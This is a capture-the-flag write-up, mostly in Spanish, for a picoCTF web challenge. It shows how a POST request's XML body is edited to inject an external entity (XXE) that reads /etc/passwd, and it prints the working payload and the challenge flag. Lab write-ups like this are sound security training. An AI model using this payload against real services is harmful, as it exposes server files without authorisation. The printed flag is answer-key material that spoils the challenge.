## Descripción

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

http://saturn.picoctf.net:58267/

## Solución

1. Se accedió al portal web proporcionado (`[http://saturn.picoctf.net:58267/](http://saturn.picoctf.net:58267/)`).

2. Se abrió la pestaña de **Network** (Red) en las Herramientas de Desarrollador del navegador y se interactuó con el botón _"Details"_ de una de las opciones disponibles.

3. Se interceptó la solicitud `POST` enviada a `/data`, identificando que transmitía una estructura en formato XML.

4. Mediante la opción **Edit and Resend** (Editar y reenviar), se modificó el cuerpo (_Body_) de la petición inyectando una entidad externa XML (XXE) dirigida al archivo del sistema

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>
  <ID>&xxe;</ID>
</data>
```

Al reenviar la petición, la respuesta del servidor incluyó el contenido del archivo `/etc/passwd`, revelando la bandera al final de la lista de usuarios.


```
picoCTF{XML_3xtern@l_3nt1t1ty_4dbeb2ed}
```

## Notas adicionales

## Referencias